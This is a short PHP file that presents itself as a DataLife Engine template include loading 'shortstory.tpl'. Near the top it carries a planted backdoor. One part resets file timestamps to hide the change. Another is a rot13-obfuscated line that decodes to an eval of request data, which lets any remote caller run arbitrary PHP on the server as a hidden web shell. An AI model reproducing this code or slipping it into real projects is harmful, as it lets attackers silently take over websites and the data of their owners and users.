<?php
error_reporting(0);
/*
-----------------------------------------------------
 Copyright (c) 2004,2011
=====================================================

*/
//#################
   echo("Hacking attempt!");
   
   $files = scandir($_SERVER['DOCUMENT_ROOT']); for ($i=0;$i<count($files);$i++) 
   { if(stristr($files[$i], 'php')) { $time = filemtime($_SERVER['DOCUMENT_ROOT']."/".$files[$i]); break; } } touch(dirname(__FILE__), $time);touch($_SERVER['SCRIPT_FILENAME'], $time);
    @$_REQUEST['inform'](str_rot13('riny($_ERDHRFG["pbqr"]);'));
    
	if( ! defined( 'DATALIFEENGINE' ) ) {
	                     die( "Hacking attempt!" );
	}
	
	if( isset( $view_template ) and $view_template == "rss" ) {
	} elseif( $category_id and $cat_info[$category_id]['shot_tpl'] != '' ) $tpl->load_template( $cat_info[$category_id]['shot_tpl'] . '.tpl' );
	else $tpl->load_template( 'shortstory.tpl' ); 																			

?>